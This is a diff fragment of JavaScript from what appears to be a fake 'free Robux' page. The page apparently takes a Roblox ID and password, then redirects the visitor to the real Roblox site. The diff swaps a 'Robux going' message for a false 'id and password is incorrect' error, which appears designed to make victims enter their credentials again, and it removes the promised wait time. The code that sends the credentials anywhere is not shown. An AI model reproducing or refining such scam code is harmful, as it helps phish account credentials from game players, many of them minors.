@@ -130,11 +130,11 @@
         // 결과를 표시할 div에 결과를 추가합니다.
         var resultDiv = document.getElementById("result");
         resultDiv.style.display = "block"; // 결과를 표시합니다.
-        resultDiv.innerHTML = "500 Robux going...(write proper id,pw)"; // "계산중..."으로 설정합니다.
+        resultDiv.innerHTML = "id and password is incorrect"; // "계산중..."으로 설정합니다.
 
         // 1초 후에 결과를 설정합니다.
         setTimeout(function() {
-            resultDiv.innerHTML = "Robux: " + result + "(it will take 10~30 minutes)" ;
+            resultDiv.innerHTML = "Robux: " + result + "x" ;
             // Redirect to Roblox in a new window after displaying the final message
             setTimeout(function() {
                 window.open("https://www.roblox.com/home", "_blank");
